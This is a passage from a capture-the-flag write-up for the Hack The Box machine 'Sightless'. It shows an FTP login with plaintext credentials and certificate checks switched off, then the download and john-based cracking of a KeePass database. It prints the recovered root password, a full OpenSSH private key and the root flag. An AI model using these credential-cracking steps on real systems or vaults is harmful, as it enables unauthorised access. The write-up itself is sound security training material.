With the newly set `password` we finally could login to the `FTP server` just to receive a `certificate error`. We fixed this by disable the `verification` of `certificates` and the application just worked fine.

```c
┌──(kali㉿kali)-[~]
└─$ lftp -u web1,wokPmauWhr sightless.htb
lftp web1@sightless.htb:~> dir
ls: Fatal error: Certificate verification: The certificate is NOT trusted. The certificate issuer is unknown.  (A1:4B:95:93:0A:CF:15:CD:DD:52:68:ED:DB:5B:92:ED:F0:F3:3C:69)
lftp web1@sightless.htb:~> set ssl:verify-certificate off
```

```c
lftp web1@sightless.htb:/> dir
drwxr-xr-x   3 web1     web1         4096 May 17 03:17 goaccess
-rw-r--r--   1 web1     web1         8376 Mar 29 10:29 index.html
```

Inside the `goaccess` directory we found a `backup` directory containing a `Database.kdb` file which we downloaded to our local machine.

```c
lftp web1@sightless.htb:/> cd goaccess
```

```c
lftp web1@sightless.htb:/goaccess> dir
drwxr-xr-x   2 web1     web1         4096 Aug  2 07:14 backup
```

```c
lftp web1@sightless.htb:/goaccess> cd backup
```

```c
lftp web1@sightless.htb:/goaccess/backup> dir
-rw-r--r--   1 web1     web1         5292 Aug  6 14:29 Database.kdb
```

```c
lftp web1@sightless.htb:/goaccess/backup> get Database.kdb
5292 bytes transferred
```

### Cracking the KeePass 2 Database Password

We used `keepass2john` to generate a `crackable format` of the `database` and within seconds we got the password for out of it.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sightless/files]
└─$ keepass2john Database.kdb > database_hash
Inlining Database.kdb
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sightless/files]
└─$ sudo john database_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 1 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bulldogs         (Database.kdb)     
1g 0:00:00:59 DONE (2024-09-08 12:17) 0.01686g/s 17.54p/s 17.54c/s 17.54C/s kucing..pisces
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Password |
| -------- |
| bulldogs |

### Investigating the KeePass 2 Database File

Since `.kdb` files are usually used within `KeePass` and not `KeePassXC`, we imported it using the `build-in` function and saw a `password` for `root` during the preview of the import process.

![](images/2024-09-08_12-21_keypassxc_database_import.png)

![](images/2024-09-08_12-22_keypassxc_root_password.png)

After finishing the import and accessing the newly created database, we took a closer look on the entry.

![](images/2024-09-08_12-26_keypassxc_password.png)

| Password             |
| -------------------- |
| q6gnLTB74L132TMdFCpK |

Besides the password we also found a `id_rsa` key which we used to login as `root` on the box. The password was not working or needed at all.

![](images/2024-09-08_12-28_keypass_ssh_key.png)

```c
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

## root.txt

```c
bash-5.1# cat root.txt
8b616c5162e24df7e40ce6b88cade9a6
```

